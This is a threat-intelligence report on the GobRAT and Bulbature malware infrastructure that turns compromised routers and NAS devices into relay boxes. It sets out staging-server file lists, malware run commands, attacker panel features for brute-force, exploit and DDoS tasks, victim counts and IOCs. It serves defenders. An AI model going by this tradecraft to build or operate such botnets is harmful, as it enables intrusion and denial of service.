# Bulbature, beneath the waves of GobRAT

- **Source :** sekoia
- **URL :** https://www.sekoia.com/blog/bulbature-beneath-the-waves-of-gobrat
- **Date :** 2024-10-02

---

## Key Takeaways

  * Since mid 2023, Sekoia Threat Detection & Research team (TDR) investigated an infrastructure which controls compromised edge devices transformed into Operational Relay Boxes used to launch offensive cyber attack.
  

  * The infrastructure has constantly evolved with a total of 63 servers identified and analysed, and is still operating at the time of publication of this report.
  

  * On some servers, it is possible to find installation scripts as well as the GobRAT and Bulbature malware. Other servers provide a view of the administration interface used to manage compromised hosts and launch attacks.
  

  * Several traces lead us to suggest that this infrastructure might be used by several operators originating from China.



## Context

On 9 October 2023, the Threat Detection & Research (TDR) team published a private report regarding an **attack campaign on edge devices** also documented by the [JPCERT/CC](https://blogs.jpcert.or.jp/en/2023/05/gobrat.html) on 29 May 2023. Since then, **the network infrastructure has remained active** and dozens of new hosts were deployed with the same characteristics as those initially identified. These hosts are monitored via the Sekoia C2 Tracker project and are capitalised within the Sekoia Intelligence Center (IC). 

In our 2023 report, we assessed that this infrastructure was very likely used to support operations of multiple intrusion sets, likely of Chinese origin, due to certain traces attributing the attacks and the victimology observed, which mainly included **edge devices transformed into Operational Relay Boxes (ORB).** For some years now, we observe that China uses **edge devices as ORB to conduct offensive cyber campaigns** , as previously reported in link with the [Quad7 operator](https://blog.sekoia.io/a-glimpse-into-the-quad7-operators-next-moves-and-associated-botnets/) or the [APT31 infrastructure](https://blog.sekoia.io/walking-on-apt31-infrastructure-footprints/). Although there was few open source information on GobRAT, TDR decided to investigate this threat in depth. 

This investigation is still in progress as of October 2024, and we will focus on **highlighting the infrastructure** and **the different types of hosts** identified. The cut-off date for indicators included in this report is 5 September 2024. 

## **Initial findings**

The initial findings came from a self-signed certificate that was used on a staging host identified by the JPCERT/CC:

**Subject DN**|  C=AU, ST=Some-State, O=Internet Widgits Pty Ltd  
---|---  
**Issuer DN**|  C=AU, ST=Some-State, O=Internet Widgits Pty Ltd  
**Serial Number**|  Decimal: 587046745646849621397962336094648657285118811505  
**Validity Period**|  2021-05-16T06:47:34 to 2031-05-14T06:47:34  
**SHA-256**|  3ab014dd8cc7878c4e840be84b111e6fa71de221c42c14b0becaf3827a744ab9  
**SHA-1**|  d0d3975b5b900b3af2dce973428475f022b16f60  
**MD5**|  af4ad0bd9221ffc63ae5acff4034834a  
  
In 2023, when other staging hosts were analysed, one host was using a second, distinct certificate:

**Subject DN**|  O=mkcert development certificate, OU=a@a-virtual-machine  
---|---  
**Issuer DN**|  O=mkcert development CA, OU=a@a-virtual-machine, CN=mkcert a@a-virtual-machine  
**Serial Number**|  Decimal: 77481536472298673143899330019234134150  
**Validity Period**|  2021-12-21T01:38:57 to 2024-03-21T01:38:57  
**SHA-256**|  27b6567f260dd689200bbda0794341b1edcf6039cfc1ae7adf0bc6477a16a1f9  
**SHA-1**|  74fe94844a337da4bdc2988609fb3c4df3f3b78d  
**MD5**|  e4b7b3a2610ad706a83667a5bac7cd31  
  
Since we started monitoring the infrastructure, it was the first time - and only occasion - that a second certificate was observed, likely an error by the operator. It led us to uncover two new host types correlating the overall infrastructure.Since 2023, these two certificates were used to **identify 63 different hosts** , including **20 that were still active** at the time of writing.

In this report, we provide a comprehensive analysis of each type of these servers.

## **Down the rabbit hole: Infrastructure overall**

Our analysis revealed a network architecture from staging servers to administration panels. This overall infrastructure was observed following an analysis of over 5,000 files on hosts that used these two self-signed certificates mentioned above. Based on our analysis, we illustrated the different infrastructure components as follows:

![GobRAT and Bulbature infrastructure. Source: Sekoia TDR Team](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a2a7e2f3ac1f0766e4154ac_azgzaga.svg)

GobRAT and Bulbature infrastructure. Source: Sekoia TDR Team

This infrastructure involves compromised edge devices that, once infected, download from attackers’ staging servers two different malicious codes: GobRAT and Bulbature. These two codes seem to have different purposes. 

GobRAT, which has been already documented by the JP-CERT, is a swiss-army knife backdoor written in Go which has standard RAT functionalities and is also used to relay specific attacks from the compromised devices such as DDoS or vulnerability exploitation campaigns. It seems to be used to gather intelligence from the networks associated with the compromised edge devices.

Bulbature, an implant that was not yet documented in open source, seems to be only used to transform the compromised edge device into an ORB to relay attacks against final victims networks.

#### ORBs

We have been able to observe **edge devices compromised****and transformed into ORBs by GobRAT and Bulbature** (initially called "kkrn") malware. The following infection chain can therefore be described in four main steps:

![Infection chain of edge devices compromised and transformed into ORBs \(Operational Relay Boxes\) by GobRAT and Bulbature. Source: Sekoia TDR Team](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a2a7e2f3ac1f0766e4154b0_group256-2.svg)

Infection chain of edge devices compromised and transformed into ORBs (Operational Relay Boxes) by GobRAT and Bulbature. Source: Sekoia TDR Team

  * **Step 1** : The operator deploys staging servers, which host Bash scripts as well as GobRAT and Bulbature malware.
  * **Step 2** : The operator compromises edge devices.
  * **Step 3** : The operator runs Bash scripts that download malware from the staging servers, and runs them.
  * **Step 4** : The edge device communicates with staging servers and Bulbature C2 & Dispenser. It is transformed into an ORB.



#### Staging servers

The list of staging servers at the date of writing is as follows:

**Staging host IP**| **ASN**| **AS Name**| **Hosting Country**  
---|---|---|---  
38.54.56.5| AS138915| KAOPU-HK Kaopu Cloud HK Limited| Japan  
38.54.85.246| Hong Kong  
38.60.134.236| France  
38.60.221.32| Russia  
38.60.221.63  
38.60.221.174  
38.60.223.51  
38.60.223.81  
38.60.221.145  
  
All the currently active hosts are located under the same autonomous system AS138915, but it was not always the case historically, since other ASNs have also been observed since 2023. It is worth mentioning that this autonomous system is increasingly used by Chinese intrusion sets. Nevertheless, all these staging servers host malicious files served on port 443 (HTTPs) or 58888 (HTTP or HTTPS). On these ports, we have identified an open directory under /static/, containing the following files

**Filename**| **Type**| **File Info**| **Creation Date**  
---|---|---|---  
sshdeny1.sh| Block script| Bourne-Again shell script| 2024-07-19  
hold_by_bot.sh| Daemon script| Bourne-Again shell script| 2024-07-31  
zoneController.sh| Daemon script| Bourne-Again shell script| 2024-07-19  
zonedelete.sh| Delete script| Bourne-Again shell script| 2024-07-19  
zonesetup.sh| Start script| Bourne-Again shell script| 2024-07-19  
zoneupdate.sh| Update script| Bourne-Again shell script| 2024-07-23  
zoneRestart.sh| Update script| Bourne-Again shell script| 2024-07-19  
bulbature| Bulbature malware| ELF 64-bit LSB executable (x86-64)| 2024-07-31  
zone.x86_64| GobRAT malware| ELF 64-bit LSB executable (x86-64)| 2024-07-19  
zone.i686| GobRAT malware| ELF 32-bit LSB executable (Intel 80386)| 2024-07-19  
zone.arm| GobRAT malware| ELF 32-bit LSB executable (ARM)| 2024-07-19  
zone.mips| GobRAT malware| ELF 32-bit LSB executable (MIPS)| 2024-07-19  
frpc.x86_64| FRP (Fast Reverse Proxy)| ELF 64-bit LSB executable (x86-64)| 2024-07-19  
frpc.i686| FRP (Fast Reverse Proxy)| ELF 32-bit LSB executable (Intel 80386)| 2024-07-19  
frpc.arm| FRP (Fast Reverse Proxy)| ELF 32-bit LSB executable (ARM)| 2024-07-19  
  
This open directory contains installation and management scripts, tools and two backdoors, GobRAT and Bulbature. In total, more than 200 files were found on the staging servers, and the first records of these files date back to 2022. Although there are variations, mainly due to the fact that many scripts contain hard coded domains, they all behave in the same way and perform the same actions.

#### Bash scripts

Full details of the chain of compromise carried out by the Bash scripts are available in Appendix 1: Bash scripts. These Bash scripts include code for:

  * Installing and running malware;
  * Ensuring persistence;
  * Blocking other potential attackers;
  * Making the host publicly accessible by disabling security mechanisms.



It is also possible to notice that update scripts are included which have the effect of deleting scripts and malware and reinstalling them entirely. This indicates a desire to keep access to a compromised device and to push out new versions of the malware, probably with new functionalities.

#### Malware interactions

GobRAT is a RAT developed in Go language providing 22 types of commands that are runned from a staging server, as reported by the [JPCERT/CC](https://blogs.jpcert.or.jp/en/2023/05/gobrat.html). Its capabilities are as follows:

  * Obtains a new C2 configuration
  * Starts, stops or confirms a reverse shell connection
  * Executes shell commands
  * Reads/writes a specified file
  * Fingerprints host
  * Captures system state data
  * Sets new communication channel for TCP/UDP
  * Runs a SOCKS5 proxy (compatible with specified port and password)
  * Runs a Fast Reverse Proxy (FRP) binary (well known and available on [Github](https://github.com/fatedier/frp))
  * Attempts to login on services like SSH, Telnet, Redis, MySQL or PostgreSQL
  * Sends HTTP/HTTPS requests to a specified IP
  * Sends HTTP/HTTPS Dictionary attack to a specified IP
  * Performs DDoS attacks using SYN, TCP, UDP, HTTP, ICMP



By analysing the content of installation scripts, it was possible to group together all the names, ports and running methods of the malware. They are constantly found in the same place in the staging servers open directory, and they are also executed at the same time.

**Malware**| **Alias**|  Run command| **Local port**| **Remote port**  
---|---|---|---|---  
GobRAT| apached  
icon_x  
asus_x| ./zone.[ARCH] -d| None| 80 (TCP, HTTPS)  
Bulbature| bulbature  
kkrn  
mostise  
myet  
rhabdia  
scindwise  
out_arm  
out_mipsle  
asus_x  
level| ./bulbature -d [PORT]  
./bulbature [PORT]| Random (UDP)  
5500 (UDP)  
8001 (TCP)| 8080 (TCP)  
  
However, it is not yet obvious how Bulbature behaves due to a very high level of obfuscation. The figure below highlights the interactions observed during the infection process of an edge device:

![The interactions of GobRAT and Bulbature observed during the infection process of an edge device](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a59d9f9b7f8b2cd14fb5_6a92a25ecd1cab63350c7842_6a2a7e2f3ac1f0766e41549a.webp)

The interactions of GobRAT and Bulbature observed during the infection process of an edge device

On this diagram, the orange-coloured data shows the parts that could not be fully identified. Despite this fact, the following steps can be observed:

  * **Step 1** : zoneupdate.sh downloads Bash scripts as well as GobRAT and Bulbature malware from a staging server.
  * **Step 2** : GobRAT and Bulbature are dropped and executed.
  * **Step 3a** : GobRAT exchanges data over TCP with a staging server.
  * **Step 3b-0**
    * **Step 3b-1:** When Bulbature is launched without any arguments (./bulbature), it connects to the Bulbature Dispenser, a server which is designed to send back a list of three [IP]:[PORT] Bulbature C2.
    * **Step 3b-2** : Bulbature malware connects to Bulbature C2 using an IP address with port from the list received in the previous step.
    * **Step 3b-3** : Bulbature listens on a random UDP port, and data is exchanged with the IP and the port of Bulbature C2 selected on the previous step.
  * **Step 3-c0**
    * **Step 3c-1** : When Bulbature is launched with an argument (./bulbature 5500 or ./bulbature -d 5500), Bulbature listens on the port entered as an argument in UDP and exchanges data with Bulbature C2.
    * **Step 3c-2** : Bulbature listens on port 8001 (TCP), bound to localhost only.



Bulbature has been the primary source of challenges encountered during the analysis. At the time of writing, it has not been possible to identify all its features and network interactions. Based on the results obtained, it appears that its behaviour is more complex than GobRAT and connects to a different infrastructure cluster than GobRAT. 

Bulbature is developed in C, compiled for x86-64, ARM or MIPS architectures and packed with UPX. It contains anti-analysis techniques such as:

  * Strings encryption: strings are encrypted using a simple xor
  * Control Flow Flattening (CFF)



The CFF complicates reverse engineering significantly. To address this issue, we tested two techniques: 

  * The use of the [d810 plugin](https://gitlab.com/eshard/d810). In some cases, this plugin removes the CFF completely or partially.
  * The development of a custom IDA Pro script to reconstruct the original control flow. Unfortunately, various special cases hindered its effectiveness.



Moreover, all samples of Bulbature are stripped and contain more than 1000 functions. Bulbature is statically compiled with the [mbedtls library](https://github.com/Mbed-TLS/mbedtls) and makes extensive use of asynchronous programming. This further complicated our analysis, preventing us from gaining a precise understanding of its function and role. 

Nevertheless, Bulbature appears to be a malware with functionalities that are primarily network-related, along with other basic features such as executing local commands.

The analysis still allowed us to identify two encrypted Bulbature C2 Dispenser servers: nbt201.dynamic-dns[.]net:8080 and eyh.ocry[.]com:443. Then, we also were able to retrieve a list of Bulbature C2 servers.

### **Proxies provider interface**

Among all hosts that have a self-signed certificate (MD5: af4ad0bd9221ffc63ae5acff4034834a), several of them share the same behaviour and we call them Proxies provider. It has not been possible to establish a clear correlation between them and GobRAT or Bulbature, so it could be linked to another piece of malware. At the time of writing, these two servers are active:

**IPv4**| **ASN**| **AS Name**| **Hosting Country**  
---|---|---|---  
47.96.119.186| AS37963| ALIBABA-CN-NET Hangzhou Alibaba Advertising| China  
178.128.96.236| AS14061| DIGITALOCEAN-ASN| Singapore  
  
The first port 8080 (HTTPS) is hosting a web interface where a login is required. By investigating the open directories of these hosts, we were able to discover an open directory containing HTML, Javascript and CSS files: the webadmin console's unpacked frontend source code. As a result, it was possible to visualise the interface without the data and extract various API endpoints.

The second port is listening on port 8888 (HTTPS) and hosts an API. The following endpoints have been identified:

**Endpoint**| **Goal**  
---|---  
/v1/wire-guard/tunnel| Display all "Security Tunnels" (proxies)  
/v1/wire-guard/node| Display all "Nodes" (compromised hosts)  
/v1/wire-guard/nodegroup/all| Display all "Nodes Groups" (group of compromised hosts)  
/v1/wire-guard/eventlog/all| Display all server logs  
/v1/wire-guard/setting| Display settings (timer alarm)  
/v1/wire-guard/user/list| Display all users  
/v1/wire-guard/user| Display the current user  
/v1/wire-guard/password| Reset password  
/v1/wire-guard/login| Connect the user (only the "root" account is authorised to connect)  
  
#### Browsing the "Security Tunnel" view

When the path /dist#/ of these hosts is consulted, the following interface is displayed.

![Proxies provider interface](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a2a7e2f3ac1f0766e415495_group259.svg)

Proxies provider interface

In the home view called "Security Tunnel", we find a table that is probably listing proxies tunnels. When a user wants to add one via the "Add" button, a window appears. When the "Generate Mode" field is checked at "Select", a new dialog appears offering to select one of the protocols: WireGuard, OpenVPN, L2TP, PPTP, SSTP, SOCKS5, SOCKS4 or HTTPS. Based on the fields displayed, it seems possible for an operator to create an on-demand proxy tunnel.

#### Browsing the "Nodes" view

Next, in the "Nodes" view, a table is displayed containing the columns "Name", "IP", "Node Group", "Status" and "operation". When the "Add" button is clicked, the following window is displayed:

![Proxies provider interface](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a2a7e2e3ac1f0766e41548f_035_fig5-3.svg)

Proxies provider interface

Judging by the form fields in this window, it can be deduced that the "Nodes" used in the "Security Tunnel" correspond to compromised edge devices. When adding a new node, the user is asked to select whether "Auto deploy first" or "Have been deployed by script".

Finally, in the "Setting" view of the interface, the following page can be found:

![Proxies provider interface](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a2a7e2d3ac1f0766e415460_gegegege.svg)

Proxies provider interface

When an operator creates a proxy tunnel, if he keeps using the same connection for too long (at least 60 minutes here), an alert will prompt on the interface.

We can conclude that this proxies provider interface allows an operator to create on-the-fly proxies tunnels compatible with several Proxy/VPN protocols. Based on the interface we can deduce that the proxies are deployed directly on the compromised edge devices. Furthermore, the alarm mechanism indicates a desire to rotate the proxy tunnel as soon as possible. This is a typical behaviour of attacker groups trying to cover their tracks, thereby reducing the traces of operations carried out.

### **GobRAT administration interface**

Still based on the certificate (MD5: af4ad0bd9221ffc63ae5acff4034834a), it was possible to identify another cluster of servers. The discovered interface is related to the administration of the GobRAT malware with high confidence. This interface has the same functionalities as those implemented in GobRAT such as performing DDoS, executing commands, doing reconnaissance or performing attacks.

**IPv4**| **ASN**| **AS Name**| **Hosting Country**  
---|---|---|---  
38.54.85.70| AS138915| KAOPU-HK Kaopu Cloud HK Limited| Hong Kong  
38.54.85.164| AS138915| KAOPU-HK Kaopu Cloud HK Limited| Hong Kong  
38.54.85.178| AS138915| KAOPU-HK Kaopu Cloud HK Limited| Hong Kong  
38.60.203.167| AS138915| KAOPU-HK Kaopu Cloud HK Limited| Hong Kong  
103.57.248.40| AS9009| M247| Hong Kong  
176.97.73.171| AS9009| M247| Japan  
38.60.203.21| AS138915| KAOPU-HK Kaopu Cloud HK Limited| Hong Kong  
38.54.85.21| AS138915| KAOPU-HK Kaopu Cloud HK Limited| Hong Kong  
38.60.203.141| AS138915| KAOPU-HK Kaopu Cloud HK Limited| Hong Kong  
  
Several servers use different HTTP ports: 14739, 42208, 42308, 52208, 58162, and provide the same service. When a user tries to browse these ports, the body response is always the same:

{"message": "need login", "success":0}

However, on any of these hosts, the path /assets leads to an open directory containing thousands of JavaScript, CSS and image files. There are several dozen versions of the interface, but all of them have the same structure and functionality. Since only the files used to display the front-end of the interface were available, it is possible to visualise what the interface looks like when a user is connected, but without the dynamic data.

#### Browsing home page

The home page consists of a table showing the aggregation of compromised edge devices, with different columns. These devices can be of different types as suggested by the "Category" field (routers, cameras, NAS, Linux or other). Still, they can also have different compatibilities according to the "Flags" field, which includes different processor architectures (x86_64, i686, ARM), operating systems (Linux, Windows), protocols (TCP or UDP) and the level of privilege acquired (Root). It is also possible to filter by the country in which they are located and whether or not they are running. To the left of this home page, a panel allows users to navigate to other views.

![Screenshot of the home page of the GobRAT administration interface, rebuilt locally](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a2a7e2f3ac1f0766e4154b9_035_fig7.svg)

Screenshot of the home page of the GobRAT administration interface, rebuilt locally _Screenshot of the home page of https://38.54.85[.]21:52208/ , rebuilt locally_

#### Browsing the "Task List" view

When the "Task List" view is consulted, it displays a table containing columns indicating actions in progress. Above, it is possible to filter, refresh or create new ones, which redirect to a new tab. A new window appears, offering three ways of creating tasks:

  * "Weak password": seems to create a brute force attack task against specific or random hosts. The services targeted can be SSH, Telnet, MySQL, Redis or PostgreSQL. Users can also choose an existing credentials dictionary, or upload it.



![Screenshot of the "Task List" view in the GobRAT administration interface.](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a2a7e2e3ac1f0766e415489_group257.svg)

Screenshot of the &quot;Task List&quot; view in the GobRAT administration interface.

  * "Exp" (for Exploit): creates a campaign designed to exploit a web vulnerability against pre-selected targets. It is possible to select a specific exploit (called a "Plugin" in the interface) or to select them all.



![Screenshot of "Exp" task creation in the GobRAT administration interface.](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a2a7e2d3ac1f0766e415472_035_fig9.svg)

Screenshot of &quot;Exp&quot; task creation in the GobRAT administration interface._Screenshot of "Exp" task creation_

  * "DDoS": creates a distributed denial-of-service (DDoS) attack campaign against a single target (IP or domain), or a block of IP addresses (called an "IP Segment" in the interface). It is possible to choose one or more specific ports, to start the campaign at a delayed time or to choose a vulnerability to be used.



![Screenshot of "DDos" task creation in the GobRAT administration interface.](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a2a7e2d3ac1f0766e41546f_035_fig10.svg)

Screenshot of &quot;DDos&quot; task creation in the GobRAT administration interface._Screenshot of "DDos" task creation_

#### Browsing the "Plugin" view

Moving on, the "Plugin" view lists all the web vulnerability exploits created. This page is designed to build custom network template actions that can be automatically deployed against targets. Four exploitation template types are available: "Exp", "Web Admin", "Camara" (note the typo) and "DDos":

![Screenshot of a "Plugin Exp" creation in the GobRAT administration interface.](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a2a7e2f3ac1f0766e4154a4_035_fig11.svg)

Screenshot of a &quot;Plugin Exp&quot; creation in the GobRAT administration interface._Screenshot of a "Plugin Exp" creation_

The interface provides precise settings of expected network behaviour. For instance, when the “Exp” plugin is selected, it is possible to enter the expected behaviour when a HTTP request is sent using the "Success Body Contains" or "Failed Body Contains" fields. It is also possible to modify its metadata, and the user can create complex sequences by adding steps as desired.

#### Browsing other views

Other views are available in the left-hand panel. The "Password Dictionnary" view allows the operator to create lists of username and password combinations that can be reused against targets. The "Ip Segment/Domain" view prompts the user to add one or more IP address blocks that can be reused for targeting. Also, there are views for each campaign type launched using the plugins, which monitor progress and results in real-time.

#### Browsing views that are not displayed

The fact that we had to rebuild the interface locally means that it is not possible to display all the pages available solely by using a web browser. However, analysing the JavaScript code makes it possible to discover new routes that can be accessed via the interface.

The route /deploybots contains a feature called "Add Script", which displays the following window:

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a2a7e2e3ac1f0766e415481_dep.svg)

The $URL_HOME variable referenced in this modal corresponds exactly to the one used in all the Bash scripts found in the staging hosts.

Finally, the route /install seems to prompt the user to install a new staging server, automatically by using SSH or manually by downloading an archive.

![Screenshot of the "/install" path](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a2a7e2e3ac1f0766e415486_035_fig13.svg)

Screenshot of the &quot;/install&quot; pathScreenshot of the "/install" path 

References to the GobRAT and Bulbature malware can be found in the "Install Server Manually" section. If the operator enters an IP address or URL, an archive named zone.tar.gz can be downloaded containing all the installation bash scripts and malware pre-configured to be hosted and accessible from a compromised host. Files in this archive correspond to the name of the GobRAT zone.[ARCH] malware and traces have been found in other open directories.

#### Other open directories

Only on a single host, we found an open directory containing files corresponding to an export of compromised devices. The following file appears to be on the main page. This is a sample of the file with some columns removed:

**IP**| **Flag**| **Location**| **Version**| **Belong**| **Online**| **Message**  
---|---|---|---|---|---|---  
[REDACTED]| L,A,R,U,T,P| South Korea| 2.0.7.2| Admin| Yes| RT-AC68U  
[REDACTED]  
  
[REDACTED]| L,A,R,U,T,P| United States| 2.0.7.2| Admin| Yes| RT-AC68U  
[REDACTED]| L,A,R,T,U,P| Sweden| 2.0.7.2| Admin| Yes| RT-AC68U [REDACTED]  
  
[REDACTED]| L,A,R,U,T,P| Hong Kong| 2.0.7.2| Admin| Yes| RT-AX56U [REDACTED]  
  
[REDACTED]| L,A,R,U,T,P| Taiwan| 2.0.7.2| Admin| Yes| RT-AX95Q no  
[REDACTED]|  | France| 1.0.| Admin| No| exit status 1  
[REDACTED]|  | Australia| 1.0.| Admin| No| Linux [REDACTED]  
4.14.24-qnap  
[REDACTED]| L,A,R| Russia| 1.0.| resource_admin| Yes| exit status 127  
  
This file contains 74,944 lines, each one being a compromised host. We can therefore deduce that on 11 July 2023 (given the date generated in the file name), this infrastructure included a botnet of almost 75,000 ORBs. A detailed study of the data in this file will be made in the "Victimology" section.

Also, an export of data from the "Task List" view was found. Here is a sample of this file, which contains 58 lines:

**IP**| **Port**| **Username**| **Password**| **CreateTime**| **Task Name**| **Type**  
---|---|---|---|---|---|---  
[REDACTED]| 9022| root| [REDACTED]| 28/02/2024 02:29| None| ssh  
[REDACTED]| 6379| alpine| [REDACTED]| 28/02/2024 02:33| None| redis  
[REDACTED]| 23| admin| [REDACTED]| 15/01/2024 12:48| None| telnet  
[REDACTED]| 23| support| [REDACTED]| 15/01/2024 12:50| telnetrouter| telnet  
[REDACTED]| 23| mg3500| [REDACTED]| 15/01/2024 12:50| telnetrouter| telnet  
  
This data indicates a credentials bruteforce campaign, where it is clearly possible to observe the credentials obtained.

Furthermore, another folder stores temporarily uploaded files. Here is a list of all the files found, the "Creation Date" column is based on file metadata:

**Filename**| **Creation Date**| **Number of rows**  
---|---|---  
[ok]【CVE-2019-9082】Thinkphp5.txt| 2024-07-05| 355,149  
[ok]【CVE-2019-13956】discuz mlv3.txt| 2024-07-05| 118,474  
[ok]【CVE-2017-5638】S2-045 远程代码执行漏洞2.txt| 2024-07-05| 325,963  
1705313101_1.txt| 2024-01-15| 500,001  
telnetlinux.txt| 2024-01-15| 800,000  
tw_ssh.txt| 2024-01-15| 842,457  
own-0209-7.txt| 2023-04-07| 131,071  
own-0209-10.txt| 2023-04-07| 133,621  
own-0209-11.txt| 2023-04-07| 3,061  
own-0209-41.txt| 2023-04-07| 68,341  
own-shiz-0214-0.txt| 2023-04-07| 0  
own-telnet-0222-0.txt| 2023-04-07| 308,551  
own-telnet-sz-02.txt| 2023-04-07| 11,133,553  
ssdaf0222.txt| 2023-04-07| 308,551  
test_ip_range1.txt| 2023-04-07| 0  
test_range_ip.txt| 2023-04-07| 65,536  
wys_test_range_ip.txt| 2023-04-07| 65,536  
lilin-38w-ip.txt| 2023-04-07| 396,874  
ssh-ip-500k.txt| 2023-04-07| 500,000  
dlink-20221208.txt| 2023-04-07| 64,399  
draytek1.txt| 2023-04-07| 42,699  
drapal7-30w.txt| 2023-04-07| 600,599  
ssh-ip.txt| 2023-04-07| 500,000  
iot-telnet-50k.txt| 2023-04-07| 499,999  
tw-telnet-60w-quchong.txt| 2023-04-07| 625,333  
qnap-all-fofa.txt| 2023-04-07| 1 377,932  
drupal-ip-60w.txt| 2023-04-07| 600,599  
0321-000.txt| 2023-03-21| 1 488,177  
0321-etest.txt| 2023-03-21| 448,876  
own-telnet-0320-5.txt| 2023-03-20| 352,085  
  
In total, 22,657,437 hosts are included. Observing the number of lines in these files, it is very likely that this data comes from an export of network infrastructure indexing engines such as Fofa (as suggested by the "qnap-all-fofa.txt" file). Based on the filenames, there are three types of targeted hosts: 

  * Hosts with shared remote administration services such as Telnet or SSH;
  * Hosts with an associated service and country (as suggested by the tw_ssh.txt file, which would correspond to all the IPs in Taiwan hosting an SSH service);
  * Type of device, as suggested by the file qnap-all-fofa.txt or draytek1.txt, which contains the IP addresses of appliances manufactured by Qnap or Draytek.



To summarise all the features included in this interface, we can deduce that an operator can use these lists of assets to try to compromise them automatically or manually using web vulnerabilities or accounts dictionaries. Once compromised, they can be remotely controlled and used as relays to launch DDoS attacks and exploit final targets.

## **Victimology** identified form the open directories on the GobRAT administration interface

We were unable to obtain a comprehensive victimology because real-time data access was not available in both interfaces we examined. However, we can still draw up a victimology based on an interface export carried out on 11 July 2023 found in open directories on the GobRAT administration interface.

![Countries infected by GobRAT and Bulbature. Source: Sekoia.io TDR Team](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a2a7e303ac1f0766e4154dc_035_fig14-1.svg)

Countries infected by GobRAT and Bulbature. Source: Sekoia.io TDR Team

Among the 74,944 retrieved hosts, a total of 139 different countries were found. 

The **United States had the highest number of infected hosts, with 28,452 hosts,** four times more than the next country, Hong kong. These infections might indicate a **strategy to get as close as possible to their targets**. This is particularly relevant in the context of the ongoing US-China tensions. 

In second place comes **Hong Kong with a total of 7,418 hosts** , and in third place **Sweden with 6,017 hosts**. The fact that these countries are among the top 3 infected hosts most probably shows that the operator wants to **obtain exit nodes or targets three continents: North America, Europe and Asia**. Finally, between 2,000 and 3,000 compromised hosts are found in the following countries: Singapore, Canada, Taiwan, United Kingdom, Germany and Italy.

Still**,** on the 74,944 hosts, a column filters hosts by their characteristics: network protocols, processor architecture, Operating System, whether it has open services, and if the operator has administrator access. Based on this, it is therefore possible to draw a distribution of hosts types:

![Distribution of infected hosts types by Bulbature and GobRAT malware. Source: Sekoia Threat Detection and Research Team](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a2a7e2f3ac1f0766e41549e_035_fig15-1.svg)

Distribution of infected hosts types by Bulbature and GobRAT malware. Source: Sekoia Threat Detection and Research Team

Most of these hosts are**Linux routers with ARM system architecture and a public IP address** , which confirms that they are indeed **edge devices**. The details in other columns indicate that they are mainly manufactured by **Asus or Qnap**. The transport protocols are both TCP and UDP, **corresponding to the running behaviour of the GobRAT and Bulbature malware**. Of note, although a "W" field for Windows is mentioned, no such host was identified.

## Conclusion

The investigation we conducted since 2023 provided us with a comprehensive overview of the features of this cluster of activity. Similar to the previous Sekoia.io publications, this architecture, consisting of **compromised edge devices acting as ORBs,** allowing an operator to carry out **offensive cyber operations around the world** near to the final targets and hide its location by creating on-demand proxies tunnels.

Considering the functionalities included in the Proxies provider interface and the GobRAT administration interface, **operators have an automated technical toolkit,** enabling them to carry out **massive exploitation** or **DDoS attacks**. Each of these interfaces has user management functionalities, suggesting that they are being used by **several operators**. Inside this ecosystem, **GobRAT and Bulbature malware operate in a complex way:** the level of obfuscation is considered to be particularly advanced. The various network interactions are difficult to identify, indicating a genuine intention by operators to **conceal infrastructures**. Several version numbers associated with malware have been recovered, implying a **constant evolution****of their functionalities** since at least 2022.

Since 2023, we have seen several ties to China. Traces in the code, interfaces historically configured with a single language, the repeated use of AS138915 "KAOPU-HK Kaopu Cloud HK Limited" and the predominantly North American targeting. This type of infrastructure, which implies compromised **appliances directly exposed on the internet** , is also very present in the **Chinese state-sponsored ecosystem**. Given the evidence at hand, we assess with a high level of confidence that **this threat originates from China**.

**Thank you for reading this blog post. Please don't hesitate to provide your feedback on our publications by[clicking here](https://framaforms.org/sekoiaio-blogposts-feedback-1721899427). You can also contact us at tdr[at]sekoia.io for further discussions, always good to have feedbacks from peers.**

## Indicators of compromise

 _Several indicators are not shared in this report. If you are a national CERT or LEA, we can share IOCs and samples with you under TLP:AMBER classification. Please contact tdr [ at ] sekoia [ dot ] io._

The following table lists all active indicators as of 5 September 2024 (cut-off date of this report), which have certificates mentioned in the Initial Findings.

Type| IPv4| ASN| Hosting Country| Certificate fingerprint (MD5)  
---|---|---|---|---  
Staging host| 38.54.56.5| AS138915| Japan| af4ad0bd9221ffc63ae5acff4034834a  
Staging host| 38.54.85.246| AS138915| Hong Kong| af4ad0bd9221ffc63ae5acff4034834a  
Staging host| 38.60.134.236| AS138915| France| af4ad0bd9221ffc63ae5acff4034834a  
Staging host| 38.60.221.32| AS138915| Russia| af4ad0bd9221ffc63ae5acff4034834a  
Staging host| 38.60.221.63| AS138915| Russia| af4ad0bd9221ffc63ae5acff4034834a  
Staging host| 38.60.221.174| AS138915| Russia| af4ad0bd9221ffc63ae5acff4034834a  
Staging host| 38.60.223.51| AS138915| Russia| af4ad0bd9221ffc63ae5acff4034834a  
Staging host| 38.60.223.81| AS138915| Russia| af4ad0bd9221ffc63ae5acff4034834a  
Staging host| 38.60.221.145| AS138915| Russia| af4ad0bd9221ffc63ae5acff4034834a  
Proxies provider interface| 47.96.119.186| AS37963| China| e4b7b3a2610ad706a83667a5bac7cd31  
Proxies provider interface| 178.128.96.236| AS14061| Singapore| e4b7b3a2610ad706a83667a5bac7cd31  
GobRAT administration interface| 38.54.85.70| AS138915| Hong Kong| e4b7b3a2610ad706a83667a5bac7cd31  
GobRAT administration interface| 38.54.85.164| AS138915| Hong Kong| e4b7b3a2610ad706a83667a5bac7cd31  
